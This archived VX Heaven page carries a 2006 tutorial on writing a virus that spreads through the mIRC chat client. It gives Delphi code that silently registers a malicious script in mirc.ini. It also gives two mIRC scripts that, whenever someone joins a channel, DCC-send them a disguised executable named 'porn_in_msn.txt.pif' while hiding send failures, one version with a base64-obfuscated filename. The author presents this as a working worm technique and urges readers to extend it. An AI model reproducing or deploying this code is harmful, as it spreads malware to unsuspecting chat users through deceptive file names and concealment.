<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Hutley 'Virus infecting the mIRC' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Hutley"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Hutley,Virus infecting the mIRC, command, criptography, rfiles, archive, text, program, section, read, entrance, sending, nick, basic, novo, virus, type"/>
<meta name="Description" content="Many people know about the Interactive Disassembler. It is a great tool for disassembling many different file formats for many different CPUs. It even has a debugger now, so it can be used for all kinds of reverse-engineering, unpacking, decrypting, etc. In case that was not enough functionality, it also supports a language called IDC. In the words of Ilfak, IDC language is a C-like language. It has the same lexical tokens as C does: character set, constants, identifiers, keywords, etc. A program in IDC consists of function declarations."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"665122b5d65b8137a806b508d9c163150c7e4be8-1498757467-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vhu01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Virus infecting the mIRC</h1><p><a href="/lib/?lang=en&amp;author=Hutley"> Hutley</a><br/> <em><a href="/vx.php?fid=1512#f1512">Ready Rangers Liberation Front [7]</a></em><br/> <em>July 2006</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vhu01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=VX#vhu01">Back to index</a>] [<a href="/lib/vhu01.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c0">Introduction</a></li>
<li><a href="#c1">Old mIRCs</a></li>
<li><a href="#c2">New mIRCs and Scripts</a>
<ul>
<li><a href="#c21">Script - With Criptography</a></li>
<li><a href="#c22">Script - Without Criptography</a></li>
</ul></li>
<li><a href="#c3">Conclusion</a></li>
</ul>
<h2><a name="c0"></a>Introduction</h2>
<p>The mIRC (messenger Internet Relay Chat) is a program made by Khaled Mardam- Bey. It's the most popular program to have access the net of IRC.</p>
<p>Amongst other things as its easiness of use, the mIRC in it allows them that they are created "scripts" to automatize the execution of some tasks.</p>
<p>Another strong point in this excellent program it is the possibility of if sending any type of archive, not only for others mIRCs, but for all the other customers of IRC. ex. pIRCh, xIRCon, xChat, ect.</p>
<p>Soon, with as many easinesses and functions, it is not of if admiring the existence of virus that infecting this program.</p>
<p>We have everything in hands, the creation of scripts and the sending of archive.</p>
<p>In this simple text, i will show as to infect the mIRC creating one script for the direct sending of the archive.</p>
<p>Codes in delphi will be presented of as virus will go to make everything this. We also will be shown some examples of scripts</p>
<h2><a name="c1"></a>Old mIRCs</h2>
<p>Old to add one script mirc, it was enough to create an archive with the commands. This archive must have the name script.ini and was alone to place it in the same folder where mirc was installed. Therefore in the next inicialization of tje mirc the script would go to be read automatically, it was not necessary to enter with any type of command.</p>
<h2><a name="c2"></a>New mIRCs and Scripts</h2>
<p>For mircs new the thing is not so simple thus. When if script wants to add one is necessary to type the command "/load -rs nome.mrc". Typed command mirc will go to act of the following form:</p>
<ul>
<li>Read the file mirc.ini ans search the section rfiles.</li>
<li>When found this section, read the last entrance; ex: n2=oi.mrc</li>
<li>It adds to a new entrance inserting new script. In the case of the</li>
</ul>
<p>previous example, the new script (novo.mrc) will be in next line with the one in this way: n3=novo.mrc.</p>
<p>Basically this is everything that our "program" will have to make. Below a stretch of routine in delphi is followed that it makes this procedure all.</p>
<div class="delphi" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; MircIni <span style="color: #000066;">:</span><span style="color: #000066;">=</span> TIniFile<span style="color: #000066;">.</span><span style="color: #006600;">Create</span><span style="color: black;">&#40;</span>mIRCDir <span style="color: #000066;">+</span> <span style="color: #ff0000;">'mirc.ini'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
<span style="color: black; font-style: italic;">// It creates an object INI and load the mirc.ini</span><br/>
<br/>
&nbsp; StrMirc <span style="color: #000066;">:</span><span style="color: #000066;">=</span> TStringList<span style="color: #000066;">.</span><span style="color: #006600;">Create</span><span style="color: #000066;">;</span><br/>
<span style="color: black; font-style: italic;">// A StringList with the name of StrMirc creates</span><br/>
<br/>
&nbsp; MircIni<span style="color: #000066;">.</span><span style="color: #006600;">ReadSection</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'rfiles'</span><span style="color: #000066;">,</span> StrMirc<span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
<span style="color: black; font-style: italic;">// Reads the section rfiles and put the values in the stringlist</span><br/>
<br/>
&nbsp; MircIni<span style="color: #000066;">.</span><span style="color: #006600;">WriteString</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'rfiles'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'n'</span> <span style="color: #000066;">+</span> <span style="color: #000066;">IntToStr</span><span style="color: black;">&#40;</span>StrMirc<span style="color: #000066;">.</span><span style="color: #006600;">Count</span><span style="color: black;">&#41;</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'novo.mrc'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
<span style="color: black; font-style: italic;">// Write inside of mirc.ini in section rfiles the new entrance with the name novo.mrc</span><br/>
<br/>
&nbsp; MircIni<span style="color: #000066;">.</span><span style="color: #006600;">Free</span><span style="color: #000066;">;</span><br/>
<span style="color: black; font-style: italic;">// It finishes the object liberating it of the memory</span><br/>
&nbsp;</div>
<p>The part hard already is made. But before this it will be necessary to create the archive that will be script. This archive will be the responsible one to make the sending of virus for that they will be in mirc.</p>
<p>I will show the basic one of one script. The two will be in truth two scripts are equal in its actions, but what it will go to differentiate one of another one will be the present criptografy inside of the code, that mirc will be decoded only when it will be to read.</p>
<p>Let's go:</p>
<h3><a name="c21"></a>Script - With Criptography</h3>
<div class="mirc" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">on 1:<a style="color: #000060;" href="http://www.mirc.com/join"><span style="color: #990000; font-weight: bold;">JOIN</span></a>:#:<span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#40;</span> <span style="color: #000099;">$nick</span> == <span style="color: #000099;">$me</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> halt <span style="color: black;">&#125;</span> | .<a style="color: #000060;" href="http://www.mirc.com/dcc"><span style="color: #990000; font-weight: bold;">dcc</span></a> send <span style="color: #000099;">$nick</span> <span style="color: #000099;">$mircdir</span> $+ porn_in_msn.<span style="color: #008000;">txt</span>.<span style="color: #008000;">pif</span><br/>
<span style="color: black;">&#125;</span><br/>
<span style="color: black; font-style: italic;">; It verifies if nick is equal to the one of victim, will be does not send for same itself</span><br/>
<br/>
<span style="color: #000099;">on 1:SENDFAIL:</span>*:<span style="color: black;">&#123;</span> halt <span style="color: black;">&#125;</span><br/>
<span style="color: black; font-style: italic;">; It does not leave to appear acknowledgment of sending imperfections</span><br/>
&nbsp;</div>
<h3><a name="c22"></a>Script - Without Criptography</h3>
<div class="mirc" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">on 1:<a style="color: #000060;" href="http://www.mirc.com/join"><span style="color: #990000; font-weight: bold;">JOIN</span></a>:#:<span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#40;</span> <span style="color: #000099;">$nick</span> == <span style="color: #000099;">$me</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> halt <span style="color: black;">&#125;</span> | .<a style="color: #000060;" href="http://www.mirc.com/dcc"><span style="color: #990000; font-weight: bold;">dcc</span></a> send <span style="color: #000099;">$nick</span> <span style="color: #000099;">$mircdir</span> $+ <span style="color: #000099;">$decode</span><span style="color: black;">&#40;</span>cG9ybl9pbl9tc24udHh0LnBpZg==,m<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #000099;">on 1:SENDFAIL:</span>*:<span style="color: black;">&#123;</span> halt <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<h2><a name="c3"></a>Conclusion</h2>
<p>As I said previously, these scripts and the example in delphi are basic. They are only for demonstrating that it is possible to make the thing and as to make it in basic way.</p>
<p>You are enough to develop these techniques and the sky will be the limit.</p>
<p>Ah, already it went forgetting me. To arrive itself at these codes in mirc, you are enough to use the command //echo -a $encode(text to encode,m). Mirc goes in the status of its and you it will see the text already codified, it has more information on codifications in mirc in its proper archive of help (mirc.hlp).</p>
<p>Good, this is everything.</p>
<p>Suggestions, critics: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="177f62637b726e616f57707a767e7b3974787a">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> - www.hutley.cjb.net</p>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vhu01">de</a><a href="/lib/index.php?lang=en&amp;id=vhu01">en</a><a href="/lib/index.php?lang=es&amp;id=vhu01">es</a><a href="/lib/index.php?lang=it&amp;id=vhu01">it</a><a href="/lib/index.php?lang=fr&amp;id=vhu01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vhu01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vhu01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vhu01">ua</a></div>
</body>
</html>
